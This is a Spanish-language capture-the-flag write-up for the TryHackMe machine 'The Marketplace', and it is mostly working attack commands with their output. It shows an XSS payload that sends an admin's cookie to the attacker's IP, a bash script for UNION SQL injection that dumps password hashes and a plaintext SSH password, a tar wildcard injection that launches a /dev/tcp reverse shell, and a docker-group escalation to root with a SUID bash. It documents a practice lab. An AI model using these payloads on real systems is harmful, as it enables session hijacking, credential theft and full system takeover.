Write Up de la machine The Marketplace de la plataforma de Tryhackme.
![](/assets/img/market/machine.png)

## Enumeracion
Empezemos detectando que puertos estan abiertos en la machina victima.
```bash
❯ nmap 10.10.113.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 14:33 -05
Nmap scan report for 10.10.113.110
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
32768/tcp open  filenet-tms
```
Detectemos que version corre para estos puertos que estan abiertos.
```bash
❯ nmap -sCV -p22,80,32768 10.10.113.110 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 14:38 -05
Nmap scan report for 10.10.113.110
Host is up (0.22s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c83cc56265eb7f5d9224e93b11b523b9 (RSA)
|   256 06b799940b091439e17fbfc75f99d39f (ECDSA)
|_  256 0a75bea260c62b8adf4f457161ab60b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Veamos el servidor web que corre en el puerto 80.
![](/assets/img/market/web.png)
Registremonos en la web y loguiemonos.

Al ingresar vemos cosas interesante por ejemplo el directorio new el cual nos deja crear una consulta, este campo es vulnerable a xss.
![](/assets/img/market/xss.png) 

Tenemos otra cosa interesante, al momento de crear la consulta tenemos un campo para reportar esta consulta.
![](/assets/img/market/adm.png)

Al momento de reportar la consulta nos dice que un administrador la va a revisar.
![](/assets/img/market/exp.png)

Entonces como el campo del cual tenemos control es vulnerable a xss podemos hacer un *Cookie Hijacking* para robarle la cookie al administrador que por detras este revisando nuestro reporte.

Usare el siguiente payload
```bash
<script>document.write('<img src="http://10.8.47.45/cookie?' + document.cookie + '">')</script>
```
Agregamos una nota con esta informacion.
![](/assets/img/market/coo.png)

Tenemos que ponernos en escucha por lo el puerto que le indiquemos.

Enviemos la consulta y posteriormente tenemos que reportarla.

Por debajo nos llega las dos solicitudes la primera que es nuestra cookie y la segunda con la cookie del administrador que esta revisando esto por detras.

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.47.45 - - [15/Mar/2023 14:59:36] code 404, message File not found
10.8.47.45 - - [15/Mar/2023 14:59:36] "GET /cookie?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTY3ODkwOTQ2M30.x1beuM-VsjOR3qyyN1m0ot2grGM9ksFlzlaLGgUT_3w HTTP/1.1" 404 -
10.10.113.110 - - [15/Mar/2023 14:59:52] code 404, message File not found
10.10.113.110 - - [15/Mar/2023 14:59:52] "GET /cookie?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2Nzg5MTA1NDZ9._bn0r86GO904MK9PZ6Y6Guu3dcQJUBNsBhDr_LChNUQ HTTP/1.1" 404 -
```

Volvamos a la web y cambiemos nuestra cookie de session por la que acabamos de obtener.

Al momento de cambiar nuestra cookie y recarga la web nos carga otro directoria el cual antes no podiamos ver.
![](/assets/img/market/pan.png)

En este directorio estan todos los usuarios de la web, si le damos click en cualquiera de estos usuarios nos lleva a una url muy curiosa.
![](/assets/img/market/sql.png)

Este campo es vulnerable a Sql Injection, para dumpear todos las datos lo voy hacer atraves de este script de bash.
```bash
#!/bin/bash

#Colours
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
yellowColour="\e[0;33m\033[1m"
blueColour="\e[0;34m\033[1m"
greenColour="\e[0;32m\033[1m"

function ctrl_c(){

  echo -e "\n${redColour}[!] Saliendo\n${endColour}"
  exit 0
}

# Ctrl + C
trap ctrl_c INT

declare -r url='http://10.10.113.110/admin'

function helpPanel(){
  echo -e "\n${yellowColour}[+] Uso:${endColour}"
  echo -e "\n\t${blueColour}i)${greenColour} Modo interactivo${endColour}"
  echo -e "\n\t${blueColour}h)${greenColour} Mostrar este panel de ayuda${endColour}"
}
function sqlInteractive(){

  cookie="Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2Nzg5MTA1NDZ9._bn0r86GO904MK9PZ6Y6Guu3dcQJUBNsBhDr_LChNUQ"
  
  while [ "$query" != 'exit' ];do

      echo -ne "${yellowColour}[~] ${endColour}" && read -r query
      curl -s -X GET -G "$url" -H "$cookie" --data-urlencode "user=0 $query" |html2text  |awk '/****** User 1 ******/,/ID: 1/' |sed 's/\*\*\*\*\*\* User 1 \*\*\*\*\*\*//' |sed 's/ID: 1//' |sed 's/User //'
  done
}
counter=0

while getopts "hi" arg;do

  case $arg in

    h);;

    i) counter+=1;;

  esac

done

if [ $counter -eq 1 ];then
  
  sqlInteractive

else
  helpPanel

fi
```
Empezemos a dumpear los datos vamos a usar rlwrap para tener historial y poder movernos mas comodo, lo ejecutamos y seleccionamos las 4 columnas que hay y vemos que nos devuelve el numero 2.
```bash
❯ rlwrap ./sqlI.sh -i
union select 1,2,3,4-- -

2
```
Vale ese numero 2 que nos devuelve es el numero 2 de nuestra consulta, veamos cual es el nombre de la base de datos actualmente en uso.
```bash
union select 1,database(),3,4-- -

marketplace
```
Veamos los nombres de todas las base de datos que se encuentran en el servidor voy a usar group_concat para que me reporte todos los datos juntos.
```bash
union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -

information_schema,marketplace
```
Enumeremos las tablas de la base de datos marketplace
```bash
union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -

items,messages,users
```
Enumeremos las columnas de la tabla users.
```bash
union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='marketplace' and table_name='users'-- -

id,username,password,isAdministrator
```
veamos el contenido de estas columnas.
```bash
union select 1,group_concat(username,0x3a,password),3,4 from users-- -

system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/
TNDBWIUmB4z.R0DT0MSGIGzsgW,michael:
$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q,jake:$2b$10$/
DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG,test:
$2b$10$zrsXw3xA0oKEYp6.2x3YFOMGYMXFAyG1S0XCPre97HG7m1vl6DdBu
```
Esto esta un poco desordenado, ordenemos esto para ver que tenemos.
```bash
❯ cat credentials.txt
system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
test:$2b$10$zrsXw3xA0oKEYp6.2x3YFOMGYMXFAyG1S0XCPre97HG7m1vl6DdBu
```
Vale tenemos 3 usuarios, si intentamos romper esto hashes no vamos a poder ya que son contraseñas robustas, sigamos enumerando la base de datos, si volvemos a enumerar las tablas hay otra de mensajes.
```bash
union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -

items,messages,users
```
Veamos las columnas de esta tabla.
```bash
union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='marketplace' and table_name='messages'-- -

id,user_from,user_to,message_content,is_read
```
Veamos el contenido de la columna message_content
```bash
union select 1,group_concat(message_content),3,4 from messages-- -

Hello! An automated system has detected your SSH password is too weak and
needs to be changed. You have been generated a new temporary password. Your new
password is: @b_ENXkGYUCAv3zJ,Thank you for your report. One of our admins will
evaluate whether the listing you reported breaks our guidelines and will get
back to you via private message. Thanks for using The Marketplace!,Thank you
for your report. We have reviewed the listing and found nothing that violates
our rules.
```
## Intrusion
Tenemos una credencial en texto claro y tenemos 3 usuarios, veamos a quien pertenece esta credencial.

Probamos esta contraseña para el usuario jake y obtenemos acceso a la maquina.
```bash
❯ sshpass -p '@b_ENXkGYUCAv3zJ' ssh jake@10.10.113.110
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 15 20:45:48 UTC 2023

  System load:  0.08               Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.15.148
  Memory usage: 28%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    96

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$ whoami
jake
jake@the-marketplace:~$ 
```

## Movimiento lateral
Si miramos los privelegios que tenemos a nivel de sudoers podemos ejecutar un script de bash como el usuario michael
```bash
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```
Este es el script
```bash
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```
Este script tiene dos problemas primero el comando tar se esta llamando de forma relativa no absoluta, si el script fuera suid se podria hacer un path hacking para secuestrar el binario pero como no es el caso, tenemos que al final del comando esta incluyendo todo lo que hay en el directorio actual desde el cual ejecutemos el este script, podemos aprovecharnos de esto para conseguir una revershell.

Si nos vamos a [Gtfobins](https://gtfobins.github.io/gtfobins/tar/#shell) solamente tenemos que crear dos archivos con los argumentos y otro con el script que va a enviarnos la revershell.

```bash
jake@the-marketplace:~$ cd /tmp/
jake@the-marketplace:/tmp$ echo '' > --checkpoint=1
jake@the-marketplace:/tmp$ echo '' > "--checkpoint-action=exec=sh rev"
```
y el archivo rev
```bash
jake@the-marketplace:/tmp$ cat rev 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.8.47.45/4444 0>&1"
```
Al momento de ejecutar el script nos va a dar un problema esto es por los permisos, para solucionar esto solamente tenemos que ejecutar esto.
```bash
jake@the-marketplace:/tmp$ chmod o+w /opt/backups/backup.tar
```
Lo ejecutamos
```bash
jake@the-marketplace:/tmp$ sudo -u michael /opt/backups/backup.sh
```
Y obtenemos la revershell por debajo
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.15.148] 52648
michael@the-marketplace:/tmp$ whoami
whoami
michael
michael@the-marketplace:/tmp$
```
## Escalada De Privelegios

Si hacemos un id estamos en el grupo docker, bueno si estamos en este grupo tenemos una escalada de privelegios facil, solamente ejecutamos este comando.
```bash
michael@the-marketplace:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# 
```
el comando anterior se encuentra en [gtfobins](https://gtfobins.github.io/gtfobins/docker/#shell) voy a darle privelegios suid a la bash para poder operar mas comodo.
```bash
# chmod u+s /bin/bash
```
Ya nos podemos salir del contenedor y migrar a root ya que le dimos privelegios suid a la bash, el parametro -p es para que atienda al propietario.
```bash
michael@the-marketplace:/$ bash -p
bash-4.4# whoami
root
bash-4.4#
```

